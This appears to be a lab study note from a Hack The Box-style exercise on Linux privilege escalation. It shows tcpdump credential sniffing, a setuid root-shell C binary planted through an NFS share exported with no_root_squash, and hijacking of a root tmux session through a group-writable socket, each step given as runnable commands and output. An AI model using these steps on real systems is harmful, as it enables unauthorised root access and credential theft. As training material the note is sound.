# Passive Traffic Capture

## Concept

- Low-privileged users may sniff traffic if `tcpdump` exists.
    
- Can capture:
    
    - Credentials
        
    - Tokens
        
    - NTLM hashes
        
    - Kerberos tickets
        
    - Cleartext passwords

```bash
tcpdump

```

# Weak NFS Privileges

## Step 1 — Enumerate NFS Shares

### Execute on Attacker Machine

```bash
showmount -e 10.129.2.12
```

## Output

```bash
Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

---

## Step 2 — Check NFS Permissions

### Execute on Victim Machine

```bash
cat /etc/exports
```

## Vulnerable Output

```bash
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

## Important Point

```text
no_root_squash = remote root user remains root
```

This allows:

- Uploading SUID binaries
    
- Creating root-owned files

# NFS Privilege Escalation

## Step 3 — Create Malicious Binary

### Execute on Attacker Machine as Root

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
```

---

## Step 4 — Compile Binary

### Execute on Attacker Machine

```bash
gcc shell.c -o shell
```

---

## Step 5 — Mount NFS Share

### Execute on Attacker Machine as Root

```bash
sudo mount -t nfs 10.129.2.12:/tmp /mnt
```

---

## Step 6 — Copy Binary

### Execute on Attacker Machine

```bash
cp shell /mnt
```

---

## Step 7 — Set SUID Bit

### Execute on Attacker Machine

```bash
chmod u+s /mnt/shell
```

---

## Step 8 — Verify SUID Binary

### Execute on Victim Machine

```bash
ls -la /tmp
```

## Output

```bash
-rwsr-xr-x 1 root root 16712 Sep 1 06:15 shell
```

# Hijacking Tmux Sessions

## Concept

- `tmux` allows multiple terminal sessions.
    
- If root shares tmux socket with weak permissions:
    
    - Another user can attach to root session.
        

---

## Step 1 — Root Creates Shared Session

### Execute on Victim Machine as Root

```bash
tmux -S /shareds new -s debugsess
```

---

## Step 2 — Change Socket Ownership

### Execute on Victim Machine as Root

```bash
chown root:devs /shareds
```

---

## Step 3 — Find tmux Processes

### Execute on Victim Machine as Low-Privileged User

```bash
ps aux | grep tmux
```

## Output

```bash
root 4806 0.0 0.1 tmux -S /shareds new -s debugsess
```

---

## Step 4 — Check Socket Permissions

### Execute on Victim Machine

```bash
ls -la /shareds
```

## Output

```bash
srw-rw---- 1 root devs 0 Sep 1 06:27 /shareds
```

---

## Step 5 — Check Group Membership

### Execute on Victim Machine

```bash
id
```

## Output

```bash
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

---

## Step 6 — Attach to tmux Session

### Execute on Victim Machine

```bash
tmux -S /shareds
```

---

## Step 7 — Verify Root Access

### Execute Inside Hijacked tmux Session

```bash
id
```

## Result

```bash
uid=0(root) gid=0(root)
```
